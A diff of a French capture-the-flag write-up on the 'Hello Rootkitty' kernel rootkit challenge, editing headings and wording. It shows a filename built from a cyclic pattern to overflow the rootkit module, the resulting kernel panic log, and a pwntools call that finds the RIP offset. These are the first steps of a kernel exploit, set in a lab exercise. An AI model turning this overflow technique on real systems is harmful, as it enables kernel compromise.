@@ -5,7 +5,7 @@
 > Une machine a été infectée par le rootkit Hello Rootkitty qui empêche la lecture de certains fichiers.
 > Votre mission : aider la victime à récupérer le contenu des fichiers affectés. Une fois connecté en SSH, lancez le wrapper pour démarrer le challenge.
 
-##Fichiers fournis
+## Fichiers fournis
 [bzImage](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/bzImage) le kernel linux
 [ecsc.ko](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/ecsc.ko) le rootkit sous forme de module kernel 
 [initramfs.example.cpio](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/initramfs.example.cpio) Le système de fichier
@@ -173,7 +173,7 @@ touch ecsc_flag_aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
 ls -l
 ```
 
-on obtient :
+En résulte un crash kernel :
 ```
 general protection fault: 0000 [#1] NOPTI
 Modules linked in: ecsc(O)
@@ -197,7 +197,7 @@ Kernel panic - not syncing: Fatal exception
 Kernel Offset: 0x37e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
 Rebooting in 1 seconds..
 ```
-Bingo ! pwntools nous donne l'offset en question (Notez la valeur de RIP)~~~~ :
+Bingo ! pwntools nous donne l'offset en question (Notez la valeur de RIP) :
 ```python
 >>> cyclic_find(p64(0x6163626161626261))
 102
